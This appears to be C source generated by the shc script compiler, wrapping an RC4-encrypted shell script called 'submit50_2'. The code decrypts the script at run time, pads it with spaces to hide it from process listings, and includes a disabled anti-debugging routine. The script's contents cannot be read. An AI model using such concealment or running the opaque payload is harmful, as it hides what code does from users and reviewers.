#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	shc -rT -f ./submit50_2 
#endif

static  char data [] = 
#define      xecc_z	15
#define      xecc	((&data[2]))
	"\212\142\161\305\262\050\356\246\236\120\244\112\275\143\176\075"
	"\040\055"
#define      inlo_z	3
#define      inlo	((&data[18]))
	"\341\376\147"
#define      lsto_z	1
#define      lsto	((&data[21]))
	"\170"
#define      tst1_z	22
#define      tst1	((&data[26]))
	"\113\124\263\220\162\142\013\304\360\256\061\244\340\133\045\174"
	"\075\220\355\252\150\061\337\037\335\263\036\277\330\341"
#define      shll_z	10
#define      shll	((&data[54]))
	"\077\305\007\242\120\317\205\333\152\003\237\127\133\047"
#define      tst2_z	19
#define      tst2	((&data[69]))
	"\062\074\031\334\327\042\253\274\147\034\261\131\373\243\352\247"
	"\253\230\124\372\157\320\137\206\221"
#define      text_z	2334
#define      text	((&data[652]))
	"\230\106\330\141\222\054\025\042\113\325\373\054\030\344\035\127"
	"\251\171\177\215\053\067\277\150\121\036\357\342\363\345\352\213"
	"\054\302\355\277\357\002\342\072\327\335\147\360\301\205\110\153"
	"\376\307\370\052\377\270\223\120\326\203\063\311\151\035\125\226"
	"\340\102\125\317\104\067\012\034\024\162\014\326\370\125\101\366"
	"\035\072\041\034\362\265\154\311\070\237\223\242\274\350\070\234"
	"\052\215\154\157\305\166\214\332\351\230\260\341\355\362\330\012"
	"\054\372\047\037\257\223\350\350\062\173\213\357\144\303\214\217"
	"\121\371\376\026\160\212\360\131\043\241\073\021\223\023\034\300"
	"\015\103\337\275\327\310\246\012\104\061\371\251\365\206\070\106"
	"\177\066\135\357\301\116\111\345\357\204\366\203\227\023\103\245"
	"\126\043\143\056\354\012\070\061\073\061\332\061\270\022\167\067"
	"\111\325\047\013\043\160\360\023\364\347\226\214\372\332\062\121"
	"\376\225\177\352\237\270\034\333\351\366\014\242\011\204\332\123"
	"\131\001\136\175\162\117\220\147\066\047\364\061\001\046\203\000"
	"\274\003\352\134\273\007\067\245\375\104\107\007\310\041\132\042"
	"\043\271\237\225\010\060\375\077\127\361\161\131\027\364\131\323"
	"\367\104\057\262\113\147\127\111\253\237\120\164\300\253\227\343"
	"\144\067\171\155\147\166\254\277\147\036\030\177\022\162\122\011"
	"\266\202\274\002\351\024\113\225\263\234\012\163\107\241\127\254"
	"\330\321\032\100\107\307\377\257\345\030\056\367\212\200\001\101"
	"\003\276\103\355\322\217\202\205\054\215\371\164\057\121\040\007"
	"\042\072\110\151\001\110\030\346\140\107\336\353\307\340\054\313"
	"\236\160\270\160\000\073\366\054\310\360\240\370\101\301\000\143"
	"\373\110\315\375\220\346\344\361\055\303\334\365\243\011\300\101"
	"\171\171\262\172\264\251\246\175\231\107\165\333\010\165\077\004"
	"\276\014\001\116\363\346\077\041\251\034\026\114\045\327\216\237"
	"\121\100\031\005\352\300\203\203\007\371\137\017\157\236\024\055"
	"\253\025\174\236\374\274\277\245\330\326\362\375\256\201\234\377"
	"\302\266\005\254\166\210\060\175\202\217\215\361\056\241\037\331"
	"\267\234\167\263\130\067\131\060\016\114\055\274\315\312\273\217"
	"\200\300\074\366\111\154\164\314\373\001\276\052\242\335\003\132"
	"\172\173\015\322\263\147\002\301\264\060\175\201\372\071\021\172"
	"\372\115\161\104\271\345\020\265\346\316\337\211\254\343\343\046"
	"\136\361\371\021\131\373\322\015\053\120\217\046\212\240\240\204"
	"\355\150\172\263\316\053\205\270\173\376\033\036\132\205\301\273"
	"\355\116\161\166\342\133\267\060\111\212\021\003\217\273\377\301"
	"\134\252\031\355\265\252\226\372\023\312\372\350\233\157\023\165"
	"\076\213\324\035\066\322\023\117\131\330\036\056\075\370\267\062"
	"\212\323\044\025\334\254\112\277\163\015\075\327\356\053\324\153"
	"\366\034\240\063\116\253\332\045\034\156\370\247\007\277\211\366"
	"\226\025\324\232\167\311\310\356\047\371\124\200\102\163\237\274"
	"\045\353\314\054\210\035\244\340\171\246\331\256\053\176\042\220"
	"\046\222\044\205\015\150\257\216\363\145\334\031\014\312\106\263"
	"\241\115\336\104\367\010\241\352\027\074\345\102\234\116\225\353"
	"\161\145\215\206\026\373\243\066\036\125\134\105\147\066\217\025"
	"\156\143\367\346\016\032\030\001\244\267\063\325\371\362\233\236"
	"\234\141\162\047\173\264\343\331\053\013\040\211\053\215\165\130"
	"\122\153\377\340\375\030\377\360\001\276\351\236\262\006\173\101"
	"\036\252\356\076\240\213\355\231\032\051\013\204\333\031\352\061"
	"\206\154\273\177\331\256\200\311\316\023\303\345\234\225\166\367"
	"\164\357\170\177\371\060\063\110\003\221\301\170\022\105\343\141"
	"\012\033\066\254\125\221\173\156\372\122\107\024\113\207\355\165"
	"\101\041\053\174\135\205\102\311\202\055\316\253\077\325\073\267"
	"\005\011\235\050\110\320\120\072\042\371\263\155\210\063\365\347"
	"\343\366\045\036\326\141\353\153\145\053\212\166\122\210\023\056"
	"\303\023\273\343\364\211\132\045\332\247\243\101\312\003\041\136"
	"\323\342\302\012\311\024\141\045\216\352\207\253\331\020\317\145"
	"\311\142\354\256\144\057\050\267\146\245\235\205\374\010\361\171"
	"\315\255\065\336\117\243\234\324\271\067\067\371\316\057\376\074"
	"\115\154\057\130\064\030\053\052\204\342\101\111\233\143\322\113"
	"\176\307\227\141\351\344\263\060\352\114\001\173\162\300\200\242"
	"\376\254\135\330\346\174\266\223\246\124\314\012\235\210\224\256"
	"\166\276\156\011\375\374\051\362\203\321\173\243\064\230\112\321"
	"\133\064\102\022\027\240\116\046\374\110\334\156\350\307\253\015"
	"\102\331\114\145\206\213\213\040\377\171\133\165\373\007\113\175"
	"\020\346\014\345\133\150\204\152\231\262\351\250\171\331\264\353"
	"\074\234\213\301\304\250\250\127\063\152\002\045\004\250\306\267"
	"\120\342\375\250\077\060\207\346\156\140\277\003\310\257\150\311"
	"\230\130\236\040\301\037\357\352\364\377\376\171\323\215\026\150"
	"\222\046\040\164\006\357\153\174\261\353\336\261\356\157\145\237"
	"\105\144\335\134\206\267\037\107\227\165\263\171\172\133\070\371"
	"\011\325\312\121\307\270\217\311\354\003\022\367\367\242\103\373"
	"\255\052\252\042\147\147\242\336\004\055\306\150\061\256\203\244"
	"\054\230\164\275\370\305\104\067\100\307\144\056\030\011\060\224"
	"\326\376\334\071\005\107\314\114\370\165\147\213\067\354\035\104"
	"\067\174\273\203\013\233\370\007\300\326\256\064\302\200\051\063"
	"\303\351\174\322\301\323\257\376\067\244\222\241\250\142\264\005"
	"\122\064\351\355\202\377\174\274\335\235\270\350\254\307\115\270"
	"\062\217\150\120\320\075\115\350\030\035\026\371\300\063\074\242"
	"\326\005\137\316\166\240\111\336\074\113\204\264\231\156\145\255"
	"\112\321\270\111\321\201\277\332\224\226\352\240\161\306\302\223"
	"\242\117\017\142\364\025\002\175\101\242\367\242\266\022\363\270"
	"\365\175\135\057\267\113\151\157\167\005\366\375\341\127\264\033"
	"\057\347\221\212\151\357\242\210\015\116\047\362\215\165\047\364"
	"\360\170\002\157\011\143\173\150\235\217\111\364\057\220\152\230"
	"\177\144\250\146\322\061\005\170\043\324\252\166\367\167\006\250"
	"\075\072\330\146\216\133\345\134\346\306\140\123\364\172\357\133"
	"\326\121\022\365\036\143\270\222\352\137\205\054\133\140\011\022"
	"\005\200\277\170\126\136\302\205\066\263\207\140\357\326\070\152"
	"\333\122\211\311\130\113\123\362\356\053\260\054\310\360\325\062"
	"\037\164\112\202\357\134\056\307\007\017\344\303\075\102\271\372"
	"\364\333\174\017\347\244\151\271\344\157\274\371\262\301\103\103"
	"\131\077\305\107\125\002\247\146\023\055\155\035\276\270\060\254"
	"\240\330\126\177\321\054\250\303\350\061\376\315\261\265\132\076"
	"\353\130\231\352\357\174\176\150\150\126\140\167\303\142\247\321"
	"\214\067\153\143\261\241\156\156\066\120\271\120\223\264\232\370"
	"\234\354\117\127\200\320\215\315\235\255\070\223\363\016\021\262"
	"\014\125\361\043\371\007\172\123\247\145\057\205\332\122\160\073"
	"\315\065\175\306\174\200\056\055\000\271\040\020\050\367\052\046"
	"\132\114\166\034\303\250\251\123\305\277\173\001\201\357\011\122"
	"\134\000\103\171\022\247\064\153\040\253\340\002\316\025\121\332"
	"\251\004\142\155\157\111\302\070\302\147\164\104\106\043\101\216"
	"\010\202\267\035\140\336\041\224\332\212\217\261\107\370\274\070"
	"\256\057\233\202\376\042\357\051\320\157\201\202\004\240\007\347"
	"\020\356\343\074\117\121\230\241\260\243\236\267\166\153\221\150"
	"\145\121\122\064\155\300\263\000\116\362\214\314\274\273\001\350"
	"\346\317\172\376\055\363\003\340\210\321\137\064\377\214\175\160"
	"\320\217\054\374\125\056\075\156\271\376\126\240\047\172\065\271"
	"\125\027\307\052\000\335\210\100\152\016\302\360\026\012\330\021"
	"\170\174\304\177\302\015\134\350\032\315\214\231\311\124\150\036"
	"\325\377\072\147\216\103\345\104\205\367\367\302\253\127\132\160"
	"\343\366\273\233\114\051\125\100\016\225\040\345\370\360\145\364"
	"\106\034\226\167\063\335\154\364\356\030\055\170\276\173\314\210"
	"\012\225\331\357\131\212\152\140\012\326\364\253\356\052\310\363"
	"\106\067\322\057\157\122\343\314\061\304\213\143\062\161\001\130"
	"\131\327\041\211\176\244\131\034\324\341\365\211\012\172\356\266"
	"\104\001\200\324\064\340\156\230\350\151\347\020\030\276\037\377"
	"\336\341\200\231\214\313\161\040\243\174\111\117\044\300\035\250"
	"\147\263\042\063\317\073\230\343\126\240\222\063\131\261\012\133"
	"\327\272\135\115\131\074\036\335\375\053\207\073\256\351\137\250"
	"\307\051\103\335\374\221\062\014\057\016\101\106\117\312\320\161"
	"\300\224\077\255\014\264\301\345\271\321\005\202\313\152\276\136"
	"\345\007\306\230\323\232\166\030\071\113\315\375\321\017\313\020"
	"\046\365\236\031\156\273\152\027\255\200\017\276\021\333\345\032"
	"\025\322\274\027\221\105\144\271\152\356\117\115\050\205\155\116"
	"\335\203\351\276\023\251\037\337\112\130\223\274\243\350\125\027"
	"\001\141\112\202\170\143\372\354\330\345\313\321\237\340\013\377"
	"\222\227\270\307\330\311\305\210\305\146\313\202\266\042\352\033"
	"\025\001\140\175\106\224\000\354\254\216\140\325\340\155\312\277"
	"\302\270\360\141\013\025\306\041\365\205\261\156\004\107\222\151"
	"\245\007\155\232\305\173\125\117\217\242\155\357\002\325\026\046"
	"\262\366\153\230\361\255\351\307\343\325\057\076\023\074\344\301"
	"\155\100\322\225\223\100\270\124\240\223\004\107\172\263\053\226"
	"\277\231\313\065\105\221\013\142\102\225\322\326\220\060\310\033"
	"\067\027\233\321\276\174\235\340\033\040\246\363\277\216\066\373"
	"\225\073\024\046\262\303\376\317\250\042\251\362\241\015\134\262"
	"\260\016\136\066\121\343\120\062\167\367\225\371\163\100\101\317"
	"\135\075\152\054\357\237\201\261\367\146\305\001\050\170\005\305"
	"\257\267\374\171\270\213\354\161\253\037\174\276\306\243\210\366"
	"\365\147\311\106\373\206\151\014\306\110\100\003\157\061\205\042"
	"\067\225\374\120\164\300\022\036\170\307\315\111\264\360\111\030"
	"\251\071\234\243\006\360\231\100\102\005\346\104\133\273\316\202"
	"\315\011\175\017\277\164\107\357\274\313\215\046\150\201\215\316"
	"\243\012\306\070\341\343\025\030\206\326\136\251\136\200\273\202"
	"\141\321\254\325\267\046\257\207\277\344\056\115\337\121\224\245"
	"\232\200\131\017\115\203\172\266\227\331\030\342\237\260\174\171"
	"\163\276\303\037\030\031\063\344\015\135\330\206\047\373\144\016"
	"\040\175\242\231\023\207\363\341\322\065\350\265\117\044\152\156"
	"\132\257\350\327\154\147\222\161\155\045\136\102\056\027\365\151"
	"\317\350\266\215\273\255\042\074\271\307\160\356\256\260\350\215"
	"\117\336\025\212\010\177\125\061\204\312\102\247\301\145\143\317"
	"\120\032\166\122\204\372\326\003\143\331\317\376\367\105\212\365"
	"\234\067\176\314\135\256\155\001\274\265\335\065\063\331\055\201"
	"\027\063\152\102\376\176\306\104\173\232\125\120\230\175\001\064"
	"\125\060\064\140\046\014\212\347\257\163\060\003\245\250\323\175"
	"\114\166\346\142\337\150\373\017\061\110\136\342\150\260\144\221"
	"\050\215\140\051\220\077\163\351\233\323\230\044\320\063\040\374"
	"\277\116\231\216\127\335\061\153\250\167\304\117\016\230\214\214"
	"\310\141\147\343\317\217\167\222\051\374\043\252\327\212\110\154"
	"\337\112\116\025\256\366\307\333\223\345\301\121\160\351\057\107"
	"\362\367\023\173\225\033\112\051\027\267\263\171\205\132\115\060"
	"\204\341\235\040\244\122\222\315\073\226\226\222\127\067\222\152"
	"\356\211\132\164\161\267\121\342\207\162\147\314\115\231\227\356"
	"\245\354\322\316\247\041\224\254\370\224\220\223\117\215\267\255"
	"\062\274\365\101\160\260\000\067\163\123\025\147\354\245\016\146"
	"\044\046\123\161\243\145\207\135\176\126\104\020\025\147\372\134"
	"\024\076\265\045\024\235\115\026\106\034\324\326\213\022\155\327"
	"\040\352\240\161\116\072\257\170\264\217\277\255\023\037\137\362"
	"\231\330\043\277\077\237\346\060\203\335\012\217\015\264\271\174"
	"\207\101\060\045\272\022\021\334\047\261\051\217\136\016\277\131"
	"\320\077\312\117\050\343\220\137\126\014\360\337\067\154\255\251"
	"\257\255\071\322\024\370\024\205\221\264\101\303\071\273\315\202"
	"\014\145\327\341\327\351\167\102\366\015\256\320\144\336\207\153"
	"\107\155\104\373\371\254\163\137\124\007\365\271\026\216\032\311"
	"\224\027\252\070\062\250\326\151\356\133\361\012\060\365\060\315"
	"\321\176\120\220\273\260\267\312\006\105\276\346\126\111\054\214"
	"\346\305\013\317\337\202\041\017\354\323\253\371\150\315\115\116"
	"\275\245\011\021\231\012\117\010\213\024\130\324\341\036\067\115"
	"\025\107\164\126\313\234\147\126\023\327\277\136\010\003\350\312"
	"\025\054\250\307\173\336\353\011\166\221\276\033\264\130\172\022"
	"\310\247\367\331\135\336\250\075\147\125\040\113\174\176\075\165"
#define      chk1_z	22
#define      chk1	((&data[3006]))
	"\143\243\234\133\325\037\075\347\065\253\027\345\326\326\140\022"
	"\204\237\122\264\175\375\365\007\022\263\062"
#define      opts_z	1
#define      opts	((&data[3030]))
	"\331"
#define      msg2_z	19
#define      msg2	((&data[3034]))
	"\165\213\150\020\177\004\101\021\051\350\020\314\160\375\315\150"
	"\330\077\051\050\235\330\155\144\306"
#define      rlax_z	1
#define      rlax	((&data[3056]))
	"\163"
#define      chk2_z	19
#define      chk2	((&data[3058]))
	"\377\163\331\033\102\365\257\030\050\017\046\130\206\337\060\316"
	"\022\114\033\226"
#define      pswd_z	256
#define      pswd	((&data[3118]))
	"\124\063\322\306\226\166\142\112\250\045\210\173\211\112\074\377"
	"\326\245\154\073\153\270\110\157\154\253\224\154\213\067\250\337"
	"\152\173\245\001\361\010\113\231\056\313\161\171\024\152\236\371"
	"\355\057\241\163\004\014\305\360\262\323\220\063\051\216\267\010"
	"\151\024\030\374\017\304\355\351\220\137\143\245\311\002\236\267"
	"\061\100\052\066\115\360\046\377\303\267\063\354\106\353\365\257"
	"\377\016\254\017\322\231\371\143\371\135\010\302\137\247\172\220"
	"\347\244\306\065\225\355\064\130\244\150\104\353\123\072\233\122"
	"\110\107\142\033\341\133\177\332\270\207\235\027\057\027\250\026"
	"\274\156\114\121\134\201\251\001\351\356\354\074\051\207\217\161"
	"\317\361\214\260\114\013\212\005\223\050\035\302\077\305\331\374"
	"\064\046\115\220\247\367\221\220\346\176\314\017\005\133\200\325"
	"\114\015\205\231\031\020\236\254\070\274\157\170\201\111\164\265"
	"\157\301\106\026\271\330\246\237\126\163\256\134\316\057\061\032"
	"\074\267\264\125\307\123\002\000\017\162\170\220\273\355\106\053"
	"\257\215\102\150\145\351\007\274\134\266\030\052\345\112\105\041"
	"\002\371\167\311\114\171\312\133\353\102\354\247\057\062\322\337"
	"\277\025\107\045\376\117\341\132\005\372\204\352\105\311\014\107"
	"\302\203\021\017\374\333\152\350\036\323\025\267\036\122\267\364"
	"\370\044\060\144\334\170\323\111"
#define      date_z	1
#define      date	((&data[3389]))
	"\004"
#define      msg1_z	42
#define      msg1	((&data[3396]))
	"\217\011\331\065\013\312\325\033\251\167\327\206\171\163\052\364"
	"\062\254\332\072\077\205\240\344\370\272\352\270\050\220\225\231"
	"\064\216\072\113\276\336\134\065\011\251\234\256\034\106\154\270"
	"\076\126\144\154"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !defined(TRACEABLE)

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !defined(TRACEABLE) */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
